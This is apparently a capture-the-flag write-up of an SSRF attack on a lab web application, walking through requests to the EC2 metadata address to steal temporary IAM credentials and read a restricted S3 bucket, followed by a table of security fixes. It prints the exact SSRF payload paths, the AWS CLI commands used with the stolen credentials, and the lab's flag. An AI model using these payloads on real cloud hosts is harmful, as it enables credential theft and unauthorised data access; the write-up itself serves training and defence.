# SSRF to Pwned

## Difficulty
🔴 Advanced

## Objective
Exploit a Server Side Request Forgery (SSRF) vulnerability
in a web application to access EC2 Instance Metadata Service
(IMDS) and steal temporary IAM credentials to access a
restricted S3 bucket.

## Tools Used
- Browser (source code inspection)
- AWS CLI

---

## Step 1 — Enumerate the web application

Accessed the provided web application:

![](01-web-app.png)

---

## Step 2 — Find S3 bucket in source code

Inspected page source and found an S3 bucket URL:
`https://huge-logistics-storage.s3.amazonaws.com`

![](02-source-code-s3.png)

---

## Step 3 — Attempt S3 bucket enumeration

```bash
aws s3 ls s3://huge-logistics-storage/
```

Found 2 folders: `web/` and `backup/`
Both returned access denied — not publicly accessible.

![](03-s3-bucket.png)

---

## Step 4 — Explore the web application

Found a dropdown menu with:
- Our Gallery
- 404 Error Page
- Add Link
- **Status** ← interesting

![](04-dropdown-menu.png)

---

## Step 5 — Analyze the Status page

Navigated to `status/status.php`:

![](05-status-page.png)

Inspected source code — the Check button sends a POST
request with a hidden field containing the URL to fetch:

```html
<form action="index.php" method="post">
  <input type="hidden" name="name" value="hugelogisticsstatus.com">
  <input type="submit" class="button" value="Check">
</form>
```

![](06-status-source-code.png)

The server fetches whatever URL is in the `name` parameter.
This is a classic **SSRF** vulnerability.

---

## Step 6 — Trigger SSRF to reach IMDS

Changed the `name` parameter to the EC2 IMDS IP address: status.php?name=169.254.169.254
![](08-ssrf-imds.png)

IMDS responded! The server is running on EC2 and
IMDSv1 is enabled (no authentication required).

---

## Step 7 — Navigate IMDS structure
status.php?name=169.254.169.254/latest
![](09-imds-latest.png)

Found: `dynamic`, `meta-data`, `user-data`

Navigated to meta-data:
status.php?name=169.254.169.254/latest/meta-data
![](10-imds-metadata.png)

---

## Step 8 — Extract IAM credentials

Navigated through IAM security credentials:
status.php?name=169.254.169.254/latest/meta-data/iam/security-credentials/ → MetapwnedS3Access

status.php?name=169.254.169.254/latest/meta-data/iam/security-credentials/MetapwnedS3Access
![](./screenshots/11-iam-credentials.png)

Extracted:
- AccessKeyId
- SecretAccessKey
- Token (session token — temporary credentials)

---

## Step 9 — Configure AWS CLI and verify identity

```bash
export AWS_ACCESS_KEY_ID=...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

aws sts get-caller-identity
```

![](12-caller-identity.png)

Confirmed: `assumed-role/MetapwnedS3Access/i-0199bf97fb9d996f1`

---

## Step 10 — Access the S3 bucket and get the flag

```bash
aws s3 ls s3://huge-logistics-storage/backup/
aws s3 cp s3://huge-logistics-storage/backup/flag.txt -
```

![](SSRF/screenshots/13-flag.png)

**Flag:** `282f08a114b4b4f2d345100db48c7110`

---

## Attack Chain Summary
![](14-attackchain.png)
## Security Failures & Fixes

| Failure                              | Fix                                                |
| ------------------------------------ | -------------------------------------------------- |
| SSRF via hidden URL parameter        | Validate and whitelist allowed URLs server-side    |
| IMDSv1 enabled on EC2                | Enforce IMDSv2 on all EC2 instances                |
| IAM role with S3 access              | Apply least privilege — only needed permissions    |
| S3 backup folder with sensitive data | Encrypt and restrict access to backup data         |
| No SSRF protection                   | Block requests to 169.254.169.254 at network level |